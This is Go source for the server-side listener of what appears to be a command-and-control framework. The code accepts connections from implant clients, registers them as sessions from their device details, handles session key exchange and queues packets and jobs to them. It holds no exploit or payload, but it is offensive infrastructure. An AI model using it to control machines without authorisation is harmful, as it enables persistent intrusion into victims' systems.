//go:build !implant

package c2

import (
	"context"
	"errors"
	"io"
	"net"
	"time"

	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var _ connServer = (*Listener)(nil)

// Listener is a struct that is passed back when a C2 Listener is added to the
// Server.
//
// The Listener struct allows for controlling the Listener and setting callback
// functions to be used when a client connects, registers or disconnects.
type Listener struct {
	listener net.Listener
	connection

	ch     chan struct{}
	cancel context.CancelFunc
	name   string
	state  state
}

// Wait will block until the current socket associated with this Listener is
// closed and shutdown.
func (l *Listener) Wait() {
	<-l.ch
}
func (l *Listener) listen() {
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.Listener.listen()")
	}
	if cout.Enabled {
		l.log.Info("[%s] Starting Listener %q..", l.name, l.listener)
	}
	for {
		select {
		case <-l.ctx.Done():
			l.state.Set(stateClosing)
		default:
		}
		if l.state.Closing() {
			break
		}
		if l.listener == nil && l.state.Replacing() {
			time.Sleep(time.Millisecond * 30) // Prevent CPU buring loops.
			continue
		}
		c, err := l.listener.Accept()
		if err != nil {
			if l.state.Replacing() {
				continue
			}
			if l.state.Closing() {
				break
			}
			if errors.Is(err, net.ErrClosed) {
				// NOTE(dij): Catch the socket being replaced, this should
				//            only happen when replacement occurs, if we ARE
				//            closing or the ctx was cancled, continue and
				//            that /should/ be hit at the top of the loop.
				continue
			}
			e, ok := err.(net.Error)
			if ok && e.Timeout() {
				continue
			}
			if cout.Enabled {
				l.log.Error("[%s] Error during Listener accept: %s!", l.name, err)
			}
			if ok && !e.Timeout() {
				break
			}
			continue
		}
		if c == nil {
			continue
		}
		if cout.Enabled {
			l.log.Trace("[%s] Received a connection from %q..", l.name, c.RemoteAddr())
		}
		go handle(l.log, c, l, c.RemoteAddr().String())
	}
	if cout.Enabled {
		l.log.Debug("[%s] Stopping Listener.", l.name)
	}
	if l.cancel(); !l.state.WakeClosed() {
		l.state.Set(stateWakeClose)
	}
	l.listener.Close()
	l.s.delListener <- l.name
	l.state.Set(stateClosed)
	close(l.ch)
}
func (l *Listener) clientLock() {
	l.s.lock.RLock()
}

// Close stops the operation of the Listener and any Sessions that may be
// connected.
//
// Resources used with this Listener will be freed up for reuse. This function
// blocks until the listener socket is closed.
func (l *Listener) Close() error {
	if l.state.Closed() {
		return nil
	}
	l.state.Set(stateClosing)
	l.cancel()
	var err error
	if !l.state.Replacing() {
		err = l.listener.Close()
	}
	<-l.ch
	return err
}
func (l *Listener) clientUnlock() {
	l.s.lock.RUnlock()
}

// IsActive returns true if the Listener is still able to send and receive
// Packets.
func (l *Listener) IsActive() bool {
	return !l.state.Closing()
}
func (l *Listener) prefix() string {
	return l.name
}

// String returns the Name of this Listener.
func (l *Listener) String() string {
	return l.name
}

// Address returns the string representation of the address the Listener is
// bound to.
func (l *Listener) Address() string {
	return l.listener.Addr().String()
}
func (l *Listener) wrapper() Wrapper {
	return l.w
}
func (l *Listener) clientClear(i uint32) {
	v, ok := l.s.sessions[i]
	if !ok {
		return
	}
	v.chn = nil
	v.state.Unset(stateChannelProxy)
}
func (l *Listener) transform() Transform {
	return l.t
}

// Done returns a channel that's closed when this Listener is closed.
//
// This can be used to monitor a Listener's status using a select statement.
func (l *Listener) Done() <-chan struct{} {
	return l.ch
}
func (l *Listener) clientGet(i uint32) (connHost, bool) {
	s, ok := l.s.sessions[i]
	return s, ok
}

// Replace allows for rebinding this Listener to another address or using
// another Profile without closing the Listener.
//
// If the provided Profile is nil, the Listener will not change it's profile.
//
// The listening socket will be closed and the Listener will be paused and
// cannot accept any more connections before being reopened.
//
// If the replacement fails, the Listener will be closed.
func (l *Listener) Replace(addr string, p Profile) error {
	if p == nil {
		p = l.p
	}
	h, w, t := p.Next()
	if len(addr) > 0 {
		h = addr
	}
	if len(h) == 0 {
		return ErrNoHost
	}
	l.state.Set(stateReplacing)
	l.listener.Close()
	l.listener = nil
	v, err := p.Listen(l.ctx, h)
	if err != nil {
		l.Close()
		return xerr.Wrap("unable to listen", err)
	} else if v == nil {
		l.Close()
		return xerr.Sub("unable to listen", 0x18)
	}
	l.listener, l.w, l.t, l.p = v, w, t, p
	if l.state.Unset(stateReplacing); cout.Enabled {
		l.log.Info("[%s] Replaced listener socket, now bound to %s!", l.name, h)
	}
	return nil
}
func (l *Listener) clientSet(i uint32, c chan *com.Packet) {
	v, ok := l.s.sessions[i]
	if !ok {
		return
	}
	if v.chn != nil {
		return
	}
	v.state.Set(stateChannelProxy)
	for v.chn = c; len(v.send) > 0; {
		select {
		case c <- (<-v.send):
		default:
		}
	}
}
func (l *Listener) notify(h connHost, n *com.Packet) error {
	if h == nil {
		return receive(nil, l, n)
	}
	s, ok := h.(*Session)
	if !ok {
		return nil
	}
	return receive(s, l, n)
}
func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
	if n.Device.Empty() || l.state.Closing() {
		return nil, io.ErrClosedPipe
	}
	if cout.Enabled {
		l.log.Debug("[%s:%s] %s: Received a Packet %q..", l.name, n.Device, a, n)
	}
	l.s.lock.RLock()
	var (
		i     = n.Device.Hash()
		s, ok = l.s.sessions[i]
	)
	if l.s.lock.RUnlock(); !ok {
		if n.Empty() && n.ID == SvHello {
			if cout.Enabled {
				l.log.Error("[%s:%s] %s: Received an empty hello Packet!", l.name, n.Device, a)
			}
			return nil, ErrMalformedPacket
		}
		if n.ID != SvHello {
			if cout.Enabled {
				l.log.Warning("[%s:%s] %s: Received a non-hello Packet from a unregistered client!", l.name, n.Device, a)
			}
			var f com.Flag
			if n.Flags&com.FlagFrag != 0 {
				f.SetPosition(0)
				f.SetLen(n.Flags.Len())
				f.SetGroup(n.Flags.Group())
			}
			return &conn{next: &com.Packet{ID: SvRegister, Flags: f, Device: n.Device}}, nil
		}
		s = &Session{
			ch:         make(chan struct{}),
			ID:         n.Device,
			jobs:       make(map[uint16]*Job),
			send:       make(chan *com.Packet, 256),
			wake:       make(chan struct{}, 1),
			frags:      make(map[uint16]*cluster),
			parent:     l,
			Created:    time.Now(),
			connection: connection{s: l.s, m: l.m, log: l.log, ctx: l.ctx},
		}
		if l.state.CanRecv() {
			s.recv = make(chan *com.Packet, 256)
		}
		if err := s.Device.UnmarshalStream(n); err != nil {
			if cout.Enabled {
				l.log.Error("[%s:%s] %s: Error reading data from client: %s!", l.name, s.ID, a, err)
			}
			return nil, err
		}
		// KeyCrypt: If client has indicated that they have a Key, generate
		//           the set from the key data passed.
		if s.sessionKeyInit(l.name, n); cout.Enabled {
			l.log.Debug("[%s:%s] %s: Received client device info: (OS: %s, %s).", l.name, s.ID, a, s.Device.OS, s.Device.Version)
		}
		l.s.lock.Lock()
		l.s.sessions[i] = s
		if l.s.lock.Unlock(); cout.Enabled {
			l.log.Info("[%s:%s] %s: New client registered as %q (0x%X).", l.name, s.ID, a, s.ID, i)
		}
	}
	if s.host.Set(a); s.sleep == 0 && ok {
		switch {
		case !s.Last.IsZero():
			s.sleep = time.Since(s.Last)
		case !s.Created.IsZero():
			s.sleep = time.Since(s.Created)
		}
	}
	if ok && s.parent != l {
		s.parent = l
	}
	if s.Last = time.Now(); !ok {
		if n.Flags&com.FlagProxy == 0 {
			s.write(true, &com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
		}
		if l.s.New != nil {
			l.m.queue(event{s: s, sf: l.s.New})
		}
	}
	c, err := l.resolve(s, a, n.Tags)
	if err != nil {
		return nil, err
	}
	// KeyCrypt: Decrypt Incoming Packet (only if non-new)
	if ok {
		s.sessionKeyUpdate(l.name, n)
	}
	if err = c.process(l.log, l, a, n, false); err != nil {
		return nil, err
	}
	return c, nil
}
func (l *Listener) resolve(s *Session, a string, t []uint32) (*conn, error) {
	if len(t) == 0 {
		return &conn{host: s, key: &s.key}, nil
	}
	c := &conn{
		add:  make([]*com.Packet, 0, len(t)),
		subs: make(map[uint32]bool, len(t)),
		host: s,
		key:  &s.key, // KeyCrypt
	}
	return c, c.resolve(l.log, s, l, a, t, false)
}
func (l *Listener) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *com.Packet, error) {
	if n.Device.Empty() || l.state.Closing() {
		return nil, 0, nil, io.ErrShortBuffer
	}
	if cout.Enabled {
		l.log.Trace("[%s:%s/M] %s: Received a Packet %q..", l.name, n.Device, a, n)
	}
	l.s.lock.RLock()
	var (
		i     = n.Device.Hash()
		s, ok = l.s.sessions[i]
	)
	if l.s.lock.RUnlock(); !ok {
		if n.ID != SvHello {
			if cout.Enabled {
				l.log.Warning("[%s:%s/M] %s: Received a non-hello Packet from a unregistered client!", l.name, n.Device, a)
			}
			var f com.Flag
			if n.Flags&com.FlagFrag != 0 {
				f.SetPosition(0)
				f.SetLen(n.Flags.Len())
				f.SetGroup(n.Flags.Group())
			}
			return nil, 0, &com.Packet{ID: SvRegister, Flags: f, Device: n.Device}, nil
		}
		s = &Session{
			ch:         make(chan struct{}),
			ID:         n.Device,
			jobs:       make(map[uint16]*Job),
			send:       make(chan *com.Packet, 256),
			wake:       make(chan struct{}, 1),
			frags:      make(map[uint16]*cluster),
			parent:     l,
			Created:    time.Now(),
			connection: connection{s: l.s, m: l.m, log: l.log, ctx: l.ctx},
		}
		if l.state.CanRecv() {
			s.recv = make(chan *com.Packet, 256)
		}
		if err := s.Device.UnmarshalStream(n); err != nil {
			if cout.Enabled {
				l.log.Error("[%s:%s/M] %s: Error reading data from client: %s!", l.name, s.ID, a, err)
			}
			return nil, 0, nil, err
		}
		// KeyCrypt: If client has indicated that they have a Key, generate
		//           the set from the key data passed.
		if s.sessionKeyInit(l.name, n); cout.Enabled {
			l.log.Debug("[%s:%s/M] %s: Received client device info: (OS: %s, %s).", l.name, s.ID, a, s.Device.OS, s.Device.Version)
		}
		l.s.lock.Lock()
		l.s.sessions[i] = s
		if l.s.lock.Unlock(); cout.Enabled {
			l.log.Info("[%s:%s/M] %s: New client registered as %q (0x%X).", l.name, s.ID, a, s.ID, i)
		}
	}
	if s.host.Set(a); s.sleep == 0 && ok {
		if s.parent != l {
			s.parent = l
		}
		switch {
		case !s.Last.IsZero():
			s.sleep = time.Since(s.Last)
		case !s.Created.IsZero():
			s.sleep = time.Since(s.Created)
		}
	}
	if s.Last = time.Now(); !ok {
		if n.Flags&com.FlagProxy == 0 {
			s.write(true, &com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
		}
		if l.s.New != nil {
			l.m.queue(event{s: s, sf: l.s.New})
		}
	}
	// KeyCrypt: Decrypt Incoming Packet (only if non-new)
	if ok {
		s.sessionKeyUpdate(l.name, n)
	}
	if err := receive(s, l, n); err != nil {
		if cout.Enabled {
			l.log.Error("[%s:%s/M] %s: Error processing Packet: %s!", l.name, s.ID, a, err)
		}
		return nil, 0, nil, err
	}
	if o {
		return s, i, nil, nil
	}
	z := s.next(true)
	z.Crypt(&s.key)
	s.keyCheck()
	return s, i, z, nil
}
